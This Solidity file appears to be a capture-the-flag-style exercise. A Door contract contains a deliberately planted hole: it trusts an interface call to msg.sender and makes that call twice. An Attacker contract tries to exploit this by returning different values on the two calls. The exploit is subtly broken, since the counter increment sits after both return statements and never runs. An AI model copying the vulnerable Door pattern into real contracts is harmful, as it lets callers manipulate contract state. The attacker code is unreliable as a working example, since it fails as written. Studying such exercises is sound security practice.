// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

interface DoorSecurity {
    function isGoodPassword(uint) external returns (bool);
}

contract Door {
    bool public open;

    constructor() public {
        open = false;
    }

    function unlockDoor(uint _password) public {
        DoorSecurity door = DoorSecurity(msg.sender);

        if (!door.isGoodPassword(_password)) {
            open = door.isGoodPassword(_password);
        }
    }
}

contract Attacker is DoorSecurity {
    uint256 counter;

    function isGoodPassword(uint) external override returns (bool) {
        if (counter % 2 == 0) {
            return false;
        } else {
            return true;
        }
        counter++;
    }

    Door original;

    constructor(Door _add) public {
        original = _add;
    }

    function unlockDoor(uint _password) public returns (bool) {
        original.unlockDoor{gas: 300000}(_password);
    }
}
